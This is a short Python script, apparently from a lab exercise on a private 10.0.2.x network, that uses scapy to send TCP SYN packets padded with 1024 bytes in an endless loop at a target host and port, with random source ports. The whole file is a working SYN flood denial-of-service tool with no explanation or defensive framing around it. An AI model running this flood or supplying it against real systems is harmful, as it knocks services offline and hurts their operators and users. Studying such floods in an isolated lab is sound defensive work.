from scapy.all import *

# attacker:      10.0.2.1 1
# probe:         10.0.2.3 3

def flood():
    target_ip = "10.0.2.2"
    target_port = 24

    ip = IP(dst= target_ip)
    tcp = TCP(sport=RandShort(), dport=target_port, flags="S")

    raw = Raw(b"X"*1024)
    p = ip/ tcp/ raw

    send(p,loop=1,verbose=0)

    

if __name__ == "__main__":
    flood()